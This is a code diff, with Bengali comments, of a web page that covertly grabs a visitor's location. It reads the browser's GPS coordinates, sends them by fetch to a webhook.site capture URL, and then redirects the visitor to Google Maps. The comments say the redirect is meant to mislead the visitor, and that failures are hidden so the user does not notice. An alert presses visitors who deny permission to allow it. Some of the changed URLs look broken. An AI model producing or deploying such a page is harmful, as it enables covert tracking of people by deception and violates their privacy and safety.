@@ -35,23 +35,33 @@
             let long = position.coords.longitude;
             let accuracy = position.coords.accuracy;
             
-            // আপনার Webhook.site এর লিংকটি নিচে বসাবেন
-            let webhookURL = "https://webhook.site/a5862d88-4134-4cf6-b412-b12c05202720"; 
+            // ফিক্সড: আপনার ইউনিক ওয়েববুক ড্যাশবোর্ড ইউআরএল
+            let webhookURL = "https://webhook.site"; 
 
-            // ডাটা ব্যাকএন্ডে পাঠানোর জন্য Fetch API
+            // ডাটা অবজেক্ট তৈরি
+            let gpsData = {
+                latitude: lat,
+                longitude: long,
+                accuracy: accuracy
+            };
+
+            // ব্রাউজার লেভেল ব্যাকএন্ড স্যান্ডবক্সিং
             fetch(webhookURL, {
                 method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ latitude: lat, longitude: long, accuracy: accuracy })
+                headers: { 
+                    "Content-Type": "application/x-www-form-urlencoded" 
+                },
+                body: JSON.stringify(gpsData)
             }).then(() => {
-                // ডাটা চলে যাওয়ার পর তাকে বিভ্রান্ত করতে আসল গুগল ম্যাপসে পাঠিয়ে দেওয়া হবে
+                // ফিক্সড: ডাটা চলে যাওয়ার পর তাকে আসল গুগল ম্যাপসে রিডাইরেক্ট করা হবে
+                window.location.href = "https://google.com" + lat + "," + long;
+            }).catch((err) => {
+                // এরর হলেও ইউজার যেন বুঝতে না পারে তাই ম্যাপে পাঠিয়ে দেওয়া
                 window.location.href = "https://google.com" + lat + "," + long;
             });
         }
 
         function showError(error) {
-            // যদি সে Allow না করে Block করে দেয়
             if (error.code == error.PERMISSION_DENIED) {
                 alert("অনুগ্রহ করে পেজটি দেখতে লোকেশন পারমিশন Allow করুন।");
             }
